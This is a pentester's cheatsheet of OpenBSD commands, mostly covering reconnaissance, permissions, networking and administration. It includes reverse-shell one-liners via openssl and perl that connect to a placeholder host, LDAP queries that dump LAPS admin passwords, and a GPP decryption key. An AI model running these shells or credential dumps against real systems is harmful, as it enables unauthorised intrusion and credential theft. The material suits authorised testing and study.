OpenBSD Cheatsheet for Pentesters
=================================

Work in progress warning

Key:
- `#` - Indicates root priveleges are normally needed

Unlike the Linux cheatsheet, the OpenBSD cheatsheet has less variation because of the unified userspace. It assumes that either `-current` or the latest release is being used (`6.4`) at this time.

Information Gathering
---------------------
- `uname -a` - prints the OS information: `OpenBSD pufferphish 6.4 GENERIC.MP#0 amd64`
- `arch` - List the architecture and machine information: `OpenBSD.amd64`
- `machine` - List machine architecture: `amd64`
- `id` - user and group IDs and the corresponding user and group: `uid=1000(cale) gid=1000(cale) groups=1000(cale)`
- `df` - List filesystem mount points. 
- `mount` - list mounted filesystem, check for world writable or writable by user. Additionally, check for the usage of `wxallowed` for mounts not mounted with W^X. `/usr/local` is `wxallowed` in 6.4 
- `last` - print the last logged in users, the time they logged in, and the tty currently in use. Reads from `/var/log/wtmp`
- `env` - print environment variables from ksh.
- `history` - print shell history. shell history on `~/.ksh_history` may not be enabled by default

Sensitive Locations
-------------------
- `/etc/` - common configurations 
- `/var/log/` - system logs
- `$HOME/.kshrc` - ksh rc init file
- `$HOME/.profile` - shell profile

Permissions
-----------
- `find / -type f -perm -o+w` - find world writable files, use `-type d` and use `2>/dev/null` to remove permission denied errors
- `find / -nouser -nogroup` - find files without owner or group
- `find / -perm -4000 ` - find SUID files
- `find / -perm -2000` - find SGID executables/folders
- `find / -type f -perm -0100` - find all executable files

Non-interactive Shell Tricks
----------------------------
- `perl -e 'exec "/bin/sh";'` - full TTY via perl
- `/bin/sh -i` - full interactive TTY

Exfil / Remote Calls
--------------------
- openssl (which is LibreSSL):

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -CAfile /tmp/cert.pem -verify_return_error -verify 1 -connect $IP:$PORT > /tmp/s; rm /tmp/s
```

- perl: 

```
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

IO Redirection
--------------
- `>` - Redirect standard out (STDOUT), truncates
- `>>` - Redirect STDOUT and appends
- `1>` - Redirect standard out (STDOUT), truncates
- `1>>` - Redirect STDOUT and appends
- `2>` - Redirect error messages (STDERR)
- `M>&N` - Redirect file descriptor M to N (for example 2>&1 will redirect STDERR to STDOUT to unify output)

Networking
----------
| what do                | command     |
| ---------------------- | --------------- |
| list listening ports   | `netstat -ltnu` |
| list interfaces | `ifconfig -a` |
| list routing table | `route -n show` |
| arp table | `arp -a` |
| active connections | `netstat -nat` |
| find hostname | `cat /etc/myname` or `hostname` |
| find DNS resolver | `cat /etc/resolv.conf` |
| find gateway | `cat /etc/mygate` or `route -n show` |

Centralized Authentication (LDAP/NIS)
----------------------------------------------
* `getent`
  * `getent passwd`
* ldap:
  * `ldap` - builtin client
  * LAPS passwords: `ldap search -H 10.13.37.2 -D "sqladmin" -w Summer18 -b "dc=DC,dc=EXAMPLE,dc=COM" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
  * Get Domain Admin users: `ldap search -H 10.13.37.2 -D "sqladmin" -w Summer18 -b "dc=DC,dc=EXAMPLE,dc=COM" -s sub '(&(objectCategory=user)(memberOf=cn=Domain Admins,cn=Users,dc=DC,dc=EXAMPLE,dc=COM))'`
  * Get all Machines: `ldap search -H 10.13.37.2 -D "sqladmin" -w Summer18 -b "dc=DC,dc=EXAMPLE,dc=COM" -s sub "(objectCategory=computer)"`

Compression
-----------
- `tar xf file.tar`
- `tar xzf file.tar.gz`
- `tar xJf file.tar.xz`
- `tar xjf file.tar.bz2`
- `gzip -c file > file.gz`
- `gzip file`
- `gzip -d file.gz`
- `gunzip file.gz`

Encoding
--------
- `b64encode` - base64 encoding. Output is based on uuencode and very strange
- `b64decode` - base64 decoding
- `openssl x509 -in cert.crt -text` - x509 decoding
- `openssl pkcs12 -in cert.p12 -info` - PKCS#12 (.p12/.pfx) decoding
- `openssl rsa -in cert.priv -check` - ASN.1 SSL RSA cert decoding

Hashing
-------
- `sha512` - 128 chars
- `sha256` - 64 chars
- `sha1` - 40 chars
- `md5` - 32 chars
- `$1$salt$hash` - MD5 crypt - 22 chars
- `$2a$salt$hash` - Blowfish crypt (default in OpenBSD, in fact crypt(3) is an alias for bcrypt(3). 
- `$2b$digits$hash` - bcrypt crypt $digits$ portion is the number of rounds and salts are included in bcrypt
- `$5$salt$hash` - SHA-256 crypt - 43 chars 
- `$6$salt$hash` - SHA-512 crypt - 86 chars 

Encryption
----------
- OpenSSL symmetric encryptin *DO NOT USE IN REAL LIFE, UNSAFE*: `openssl aes-256-cbc -a -salt -in secrets.txt -out secrets.txt.enc`
- GPP Decryption: `echo "$1" | openssl enc -aes-256-cbc -d -a -p -iv "" -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -nosalt;`
Compilation
-----------
List of common compilers:
* `cc` - clang is now the default compiler. Unlike some Linux distros OpenBSD is almost guarenteed to have a compiler 
* `clang`

User / Password Management
--------------------------

| File | Usage | Def. Perms | Format |
| ---- | ----- | ---------- | ------ |
| `/etc/master.passwd` | Account information with hashes | Root user readable | `name`:`hashed_password`:`uid`:`gid`:`class`:`change_time`:`expire`:`gecos`:`home_dir`:`shell` |
| `/etc/passwd` | Account information | World readable, generated from `pwd_mkdb(8)` | `name`:`hashed_password`:`uid`:`gid`:`class`:`change_time`:`expire`:`gecos`:`home_dir`:`shell` |
| `/etc/group` | Group definitions | World readable | `group_name`:`password (optional)`:`GID`:`user_list` |
| `/etc/ptmp` | Lock file for password database |  |  |
| `/etc/login.conf` | Lock file for password database | Attributes for login classes | see `login.conf(5)` for details |

Common commands for user management (these are not standardized and your mileage may vary):
* `passwd` - Change user password
* `chsh` - Change shell
* `usermod` - Modify user accounts
* `groupmod` - Modify group settings
* `useradd` - Add users
* `adduser` - Add user
* `userdel` - Delete users
* `groupadd` - Add groups
* `groupdel` - Delete groups

Init Systems and Services
-------------------------

Interacting with init systems / services

| Function | command |
| -------- | ------- |
| Get service information | rcctl get $NAME | 
| Set service settings | rcctl set $NAME var=setting | 
| Check service status | rcctl check $NAME |
| Stop service | rcctl stop $NAME |
| Start service | rcctl start $NAME |
| Enable service | rcctl enable $NAME |
| Disable service | rcctl disable $NAME |
| Restart service | rcctl restart $NAME |
| List services | rcctl ls all |
| List running services | rcctl ls started |

Kernel Modules
--------------
They don't exist lol

